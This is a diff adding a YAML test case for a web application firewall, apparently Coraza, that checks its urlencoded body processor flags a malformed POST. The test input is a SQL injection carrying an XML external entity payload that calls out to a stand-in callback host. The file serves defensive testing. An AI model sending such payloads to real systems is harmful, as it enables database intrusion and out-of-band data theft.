@@ -1,0 +1,24 @@
+---
+  meta:
+    author: jptosso
+    description: Test if the body processors work
+    enabled: true
+    name: posturlencoded.yaml
+  tests:
+  -
+    test_title: posturlencoded
+    stages:
+    -
+      stage:
+        input:
+            uri: /
+            method: POST
+            data: var=EmptyValue'||(select extractvalue(xmltype('<?xml version="1.0" encoding="UTF-8"?><!DOCTYPE root [ <!ENTITY % awpsd SYSTEM "http://0cddnr5evws01h2bfzn5zd0cm3sxvrjv7oufi4.example'||'foo.bar/">%awpsd;
+        output:
+          triggered_rules:
+            - 100
+  rules: |
+    SecRequestBodyAccess On
+    SecAction "id:1, phase:1, ctl:forceRequestBodyVariable=on"
+    # urlencoded_error must be set because of the invalid payload
+    SecRule &URLENCODED_ERROR "!@eq 0" "id: 100, log"
